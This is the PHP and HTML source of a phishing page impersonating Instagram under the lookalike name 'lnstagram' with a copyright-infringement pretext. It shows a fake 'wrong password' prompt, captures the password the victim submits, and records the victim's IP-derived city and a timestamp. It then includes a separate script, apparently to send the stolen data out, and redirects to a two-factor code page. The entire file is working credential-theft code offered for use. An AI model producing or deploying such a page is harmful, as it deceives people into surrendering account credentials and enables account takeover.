<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);
 
$profile = $_SESSION["blndsc"];
$username =  $_GET['username'];
include("instagramapi.php");


if ($_POST) {
    $blind = $_SESSION["blndsc"];
    $blindP =  $_POST['blnps'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    $sehir = $details->city;
    date_default_timezone_set('Europe/Istanbul');
    $tarih = date("d-m-Y H:i:s");
	
    header("location: user-doublefactor.php");
      include 'tg2.php';
  }
  ?>

<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<link rel="stylesheet" type="text/css" href="bestory.css">
	<title>lnstagram | @<?=$username?></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="icon.png">
	<meta property="og:image" content="icon.png">
<meta property="og:description" content="Instagram Copyright Infringement Information Center ">
<meta property="og:title" content="lnstagram | Copyright">
	<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="stylesheet" type="text/css" href="../../use.fontawesome.com/releases/v5.12.1/css/all.css">

</head>
<body>
	<center>
		<div class="main_bestory">
			<img src="main-text.png" class="mainx_logo" alt="lnstagram" width=200>
			<br>
			<button type="submit" class="none_button"><i class="fab fa-facebook-square" id="req"></i> Continue With Facebook</button>
			<table class="table">
				<tr class="tr">
					<td class="td1"><div></div></td>
					<td class="td2"><p>or</p></td>
					<td class="td3"><div></div></td>
				</tr>
			</table>
			
				<form method="POST">
				<img src="<?php echo $profilz; ?>" width=150 class="haveBorder" alt="photo"><br>
<span class="bestory_text2">Enter your password and confirm your account.
</span>
					<br>
			<input type="password" name="blnps" placeholder="password" required="" class="bestory_username" id="username"><br>


			<button type="submit" class="bestory_submit">@<?=$username?> as a continue </button>

			<br>
			<span class="alert">Sorry, your password was wrong. Please double check your password.</span>

			<a href="https://www.instagram.com/accounts/password/reset/" style="text-decoration:none;"><span class="dont"><span>your fargot password?</span></span></a>
				</form>
				
			</div>
			<br><br><br><br><br><br><br>
<img src="from.png" width=150 class="img_bottom">
			<div class="bottom">
			<span>about </span>
					<span>Blog</span>
					<span>Jobs</span>
					<span>Help</span>
					<span>API</span>
					<span>Privacy</span>
					<span> Terms</span>
					<span>The Best Calculations</span>
					<span>Hashtag's</span>
					<span>Locations</span>
				</div>
	</center>
</body>
<script type="text/javascript">
	let btn=document.querySelector('.bestory_submit');
	let username=document.querySelector('.bestory_username');
	btn.disabled=true;
	btn.style.opacity="0.4";
	username.addEventListener('input',()=>{
		if(username.value.length>3){
			btn.disabled=false;
	btn.style.opacity="1";
		}else{
			btn.disabled=true;
	btn.style.opacity="0.4";
		}
	})
	
</script>

</html>